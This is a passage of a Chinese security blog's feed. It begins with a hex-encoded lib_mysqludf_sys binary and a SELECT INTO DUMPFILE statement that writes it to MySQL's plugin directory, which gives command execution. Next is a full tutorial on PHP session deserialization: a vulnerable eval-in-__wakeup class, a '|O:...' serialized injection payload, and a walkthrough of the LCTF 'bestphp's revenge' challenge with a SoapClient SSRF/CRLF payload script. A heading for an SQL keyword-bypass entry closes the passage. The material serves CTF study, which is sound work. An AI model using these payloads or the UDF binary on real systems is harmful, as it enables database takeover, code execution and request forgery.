0008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span> INTO DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT <span class="hljs-number"></span> INTO DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web技术总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>session反序列化</title>
    <link href="/2024/12/01/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/12/01/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="pfMJY">先了解什么是session</h1>默认看文章的都有反序列化基础，否则请看[PHP反序列化（一）](https://unjoke.github.io/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/)<p><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;Session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 </font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论</font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;PHP session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">机制。</font></p><blockquote><p><font style="color:rgb(127, 140, 147);">会话：就是客户端浏览器和服务器的一次数据交互</font></p><p><font style="color:rgb(127, 140, 147);">出现会话的原因：我们知道客户端浏览器访问网站使用的是http(https)协议,http协议是一种无状态的协议，意思就是说不会储存任何东西，每一次的请求都是没有关联的，这样做的好处就是速度快，但是现在就出来了一个问题，比如我们向login.php发送了一个登录请求，并完成了登录，但是由于http的无状态，这个登录只是在login.php上面进行了，但是并没有在index.php上面登录，那我们的登录是没有意义的，所以就产生了cookie，cookie是一个缓存用于一定时间的身份验证，在同一域名下面是全局的，所以说在同一域名下的页面都可以访问到cookie，这样http协议的无状态产生的问题就解决了，但是由于cookie保存在客户端浏览器，这样的话我们就可以去修改cookie，这样的话就很不安全，在这种情况下产生了session，session的本质和cookie一样，但是session保存在服务端。</font></p></blockquote><p><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;PHP session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，</font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;PHP Session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 </font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;session&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 值会存储于服务器端，这也是与 </font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;cookie&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">的主要区别，所以</font><code>&lt;font style=&quot;color:rgb(221, 17, 68);&quot;&gt;seesion&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);"> 的安全性相对较高。</font></p><h1 id="cVQuQ">session工作原理剖析</h1><h2 id="OnHsa">session工作机制</h2>当我们开启一个会话时，php会尝试在请求中查找sessio_id,如果在请求中的cookie，GET,POST里面没有找到session_id,这个时候php会调用php_session_create_id函数创造一个新的会话并且在`http response`中通过`set-cookie`头部发送给客户端保存<h2 id="Iq6SC">session_start()函数</h2>这里解释一下`session`的创造过程，`session_statrt()`这个函数，这个函数的作用是开启会话，初始化`session`数据<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Seesion_start</span>()函数会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时<span class="hljs-title function_ invoke__">Session_start</span>()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的<br></code></pre></td></tr></table></figure><p>刚才说过<code>session</code>的作用是开启会话，也就是打开<code>session</code>，也就是说如果我们想要使用<code>session</code>功能，可以使用<code>session_start</code>来开启，这个函数既不会成功也不会报错，它的作用是打开<code>Session</code>，并且随机生成一个32位的<code>session_id，session</code>的全部机制也是基于这个<code>session_id</code>，服务器就是通过这个唯一的<code>session_id</code>来区分出这是哪个用户访问的</p><h2 id="C20jb">session储存</h2>上面说了session_id的产生，下面我们来看一下session的储存，测试payload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;session_id(): &quot;</span>.<span class="hljs-title function_ invoke__">session_id</span>().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;COOKIE: &quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;PHPSESSID&quot;</span>];<br></code></pre></td></tr></table></figure><p>也是可以看到随机生成了一个<code>session_id</code></p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730424216526-aa463cdb-3a05-49b6-aa28-1cb1731dcdb1.png"></p><p>并且被储存在网页的cookie里面，查看目录同样存在</p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730424499665-195441a5-ee17-476b-969c-f13d5c24e0b0.png"></p><p>可以看到我们生成的session的储存名称是以sees_+sesion_id组成的</p><p>前面我们也说过session会保存在cookie中，那我们是否可以通过修改cookie中的phpsession来修改session_id呢？</p><p>尝试一下：</p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730424703319-df11d933-0ae6-4064-962f-9be2a66ffa3a.png"></p><p>将他修改成<code>woaini</code>，看看目录是否被修改了</p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730424816547-dfd52c46-a3a5-4895-8419-68a6cd0dc0cf.png"></p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730424759584-9c6e62a7-f8c2-4985-80ea-3c1c6086d6a0.png"></p><p>可以看到生成了一个全新的session_id，而不是修改原先文件，现在我们尝试写入新的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test1&#x27;</span>]=<span class="hljs-string">&#x27;coke&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;test2&#x27;</span>]=<span class="hljs-string">&#x27;xiao mao lao di&#x27;</span>;<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;session_id(): &quot;</span>.<span class="hljs-title function_ invoke__">session_id</span>().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;COOKIE: &quot;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;PHPSESSID&quot;</span>];<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425124228-37854a9a-dfcb-420d-a266-3d927e5df687.png"></p><p>文件有了内容，而且是序列化的内容，分析一下过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">就是HTTP请求一个页面后，如果用到开启session，会去读COOKIE中的PHPSESSID是否有，如果没有，则会新生成一个session_id，先存入COOKIE中的PHPSESSID中，再生成一个sess_前缀文件。当有写入<span class="hljs-variable">$_SESSION</span>的时候，就会往sess_文件里序列化写入数据。当读取到session变量的时候，先会读取COOKIE中的PHPSESSID，获得session_id，然后再去找这个sess_session_id文件，来获取对应的数据。由于默认的PHPSESSID是临时的会话，在浏览器关闭后就会消失，所以，当我们打开浏览器重新访问的时候，就会新生成session_id和sess_session_id这个文件<br></code></pre></td></tr></table></figure><h1 id="gufy1">session在php.ini配置</h1>session的保存位置是由php.ini文件控制的，那我们接下来看一下php.ini中于session有关的配置<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">session.save_path：这是session文件的储存路径<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425508439-619eff43-5bb5-4d76-b47c-94d0ed54c955.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">session.auto_start：这个开关是指定是否在请求开始时就自动启动一个会话，默认为Off；如果它为On的话，相当于就先执行了一个<span class="hljs-title function_ invoke__">session_start</span>()，会生成一个session_id，一般来说这个开关是不会打开的<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425538846-a5b35c6d-3f9d-4f93-b898-4369e47eb797.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">session.save_handler：这个是设置用户自定义session存储的选项，默认是files，也就是以文件的形式来存储的<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425580576-1982f3ac-a97e-447b-8476-06be56d28300.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">session.serialize_handler：这是最重要的部分，定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，默认是php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425625090-53e5d9e7-c66b-4e94-a185-3d545e9e082e.png"></p><p>session.serialize_handler是定义序列化&#x2F;反序列化的处理器名字，我们可以看到我们测试环境的处理器是php，而在session文件中经过php处理器处理过的以”|”把键名和键值分开了，这就是php处理器的特性，下面我们来看一下序列化&#x2F;反序列化常用处理器得特性和作用</p><h2 id="kM1f3">session.serialize_handler处理器</h2>| 处理器 | 对应储存格式 || --- | --- || php | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 || php_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 || php_serialize (php>=5.5.4) | 经过 serialize() 函数反序列处理的数组 |<p>看看别人给出来的三个处理器的区别</p><h3 id="ngx29"><font style="color:#DF2A3F;">php</font></h3>![](https://raw.githubusercontent.com/unjoke/imjoke/img/1730425834517-8ee55fe3-e546-4108-9f2d-743e643d8df4.png)<h3 id="PpnAT"><font style="color:#DF2A3F;">php_binary</font></h3>![](https://raw.githubusercontent.com/unjoke/imjoke/img/1730425823856-96487e78-29e8-461a-ac5d-7033d0cce9ab.png)<h3 id="p0KBl"><font style="color:#DF2A3F;">php_serialize</font></h3>![](https://raw.githubusercontent.com/unjoke/imjoke/img/1730425818362-4e88aa31-fcbf-49f1-b195-1bf8889cffb9.png)<h1 id="eXHIF">session反序列化</h1>重头戏来了！！！！！！<p>session不需要unserialize()就能够进行反序列化，但是究竟是怎么进行反序列化呢？<br>我们来看一下session_start()函数的官方文档<a href="https://www.php.net/manual/en/function.session-start.php">PHP: Hypertext Preprocessor</a></p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730425986701-f79715fa-67c1-4073-8ff9-72a9e0cd3981.png"></p><p>可以看到官方文档的一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP 会自动反序列化数据并且填充 <span class="hljs-variable">$_SESSION</span> 超级全局变量<br></code></pre></td></tr></table></figure><p>展示一下个人理解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">倘若你重新提交了会话的id他会重新使用当前会话，并且将提之前sess文件里的内容反序列化填充到session里面<br></code></pre></td></tr></table></figure><p>既然这样那我们如果把序列化后的内容提前写入到sess文件中，然后刷新页面，就会调用read函数返回现有会话数据，php会把我们之前已经传入的数据进行反序列化操作，这样就会触发反序列化漏洞。</p><p>但是现在还有一个问题要解决，因为我们传入的是键值对，那么<code>session</code>序列化存储所用的处理器肯定也是将这个键值对写了进去，怎么才能让它正好反序列化到我们传入的内容。</p><p>这里就要用到我们上面介绍到的不同序列化处理器的特性，我们可以在我们传入的序列化内容前面加一个|,在<code>php_serialize</code>处理后会返回一个序列化后的数组，但是在使用php处理器会以竖线|作为一个分隔符，前面的为键名，后面的为键值，然后将键值进行反序列化操作，这样就能够实现我们session反序列化操作</p><h2 id="zZODU">看看本地测试</h2>漏洞页面<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unjoke</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>session传参页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unjoke&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;unjoke&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unjoke&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传输<code>?unjoke=O:6:&quot;unjoke&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1730427717720-b57b7913-5e9b-4b1d-8ed6-f535c9f3e84f.png"></p><p>|之前的会被认定为键名，|之后会被认定为键值，所以<code>unjoke</code>被当成了一个字符，并不会触发反序列化</p><p>传入<code>?unjoke=|O:6:&quot;unjoke&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42549390/1730427814400-2f9e6362-2e68-445d-86d8-57512e6db35e.png"></p><p>这个时候键名不再是<code>unjoke</code>了，而是<code>a:1:&#123;s:6:&quot;unjoke&quot;;s:45:&quot;</code>，回到漏洞触发的代码块，可以看到反序列化漏洞成功触发</p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730428033387-753b38e6-d14a-411a-80b0-02e377d5c025.png"></p><h1 id="l5og6">题目试试水</h1><h2 id="z9DOI">bestphp's revenge</h2>进来就是代码审计，注释版本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 高亮显示当前文件的代码</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 定义变量 $b 为字符串 &#x27;implode&#x27;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;implode&#x27;</span>;<br><span class="hljs-comment">// 使用 call_user_func 函数调用 $_GET[&#x27;f&#x27;] 作为函数名，并将 $_POST 作为参数传递</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>], <span class="hljs-variable">$_POST</span>);<br><span class="hljs-comment">//$_POST返回的是数组，解释器会将$_POST数组中的键转换为变量，例如post传参a=1，这个时候a就会被转化成$a</span><br><span class="hljs-comment">// 启动会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 如果 URL 中存在 &#x27;name&#x27; 参数，将其值存入会话变量 &#x27;name&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-comment">// 输出当前会话的所有变量</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-comment">// 创建一个数组 $a，其中包含会话变量 &#x27;name&#x27; 的值（如果存在）和字符串 &#x27;welcome_to_the_lctf2018&#x27;</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<br><span class="hljs-comment">// 使用 call_user_func 调用 implode 函数，将数组 $a 转换为字符串，reset() 函数用于将数组的内部指针重置到第一个元素，并返回该元素的值。</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>存在flag.php,访问flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">only localhost can get flag!<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-variable">$flag</span>;<br>   &#125;<br>only localhost can get flag!<br></code></pre></td></tr></table></figure><p>思路梳理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">思路就是利用SoapClient 类构造出ssrf的序列化字符串，然后利用call_user_func修改配置，造成序列化与反序列化引擎不同的漏洞，然后调用extract函数去变量覆盖，调用SoapClient类，从而触发__call方法，想直接在flag.php伪造ip肯定是不行的，我帮你们试过了<br></code></pre></td></tr></table></figure><p>由于<code>SoapClient</code>类的<code>__call</code>方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求，我们就可以利用这个类来进行ssrf（结合<font style="color:rgb(77, 77, 77);">CRLF注入</font>），伪造脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;<br><span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<br>    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;abc\r\nCookie: PHPSESSID=123456\r\n&quot;</span>,<br>    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br></code></pre></td></tr></table></figure><p>这里一般情况下用<code>ini_set</code>的，但是<code>ini_set</code>不能识别数组，所以换成了<code>session_start</code>，然后POST传入<code>serialize_handler=php_serialize</code></p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730524007737-6d4e4dc2-7263-4895-913f-1c7b2ca5b28d.png"></p><p>接下来就是要想办法引用<code>SoapClient</code>类的<code>__call</code>方法了，这个我们需要调用<code>$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>，这个写法可以调用类里面的方法，可以学习一下，但是现在<code>$b = &#39;implode&#39;;</code>所以我们需要将<code>$b</code>覆盖，使用函数<code>&lt;font style=&quot;color:#000000;&quot;&gt;extract()&lt;/font&gt;</code></p><p><img src="https://raw.githubusercontent.com/unjoke/imjoke/img/1730524027565-1634d2f0-d89d-4d89-9a9a-309011dbc77e.png"></p><p>并没有得到预期的结果，放到本地发现是无法动态调用<code>extract</code>，推测题目也是因为这个，如果动态调用了只要把<code>cookie</code>修改成伪造的<code>cookie</code>就可以得到<code>flag</code></p><h1 id="VOLUs"><font style="color:rgb(51, 51, 51);">参考文章</font></h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">https://xz.aliyun.com/t/<span class="hljs-number">6640</span>?time__1311=n4%<span class="hljs-number">2</span>BxnD0Dg7%<span class="hljs-number">3</span>DYqBK0QD%<span class="hljs-number">2</span>FiWReOCtG%<span class="hljs-number">3</span>DzihDBGoD<br>https://www.cnblogs.com/GTL-JU/p/<span class="hljs-number">16859098</span>.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web技术总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL关键字绕过</title>
    <link href="/2024/08/24/SQL%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87/"/>
    <url>/2024/08/24/SQL%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87/</url>
    
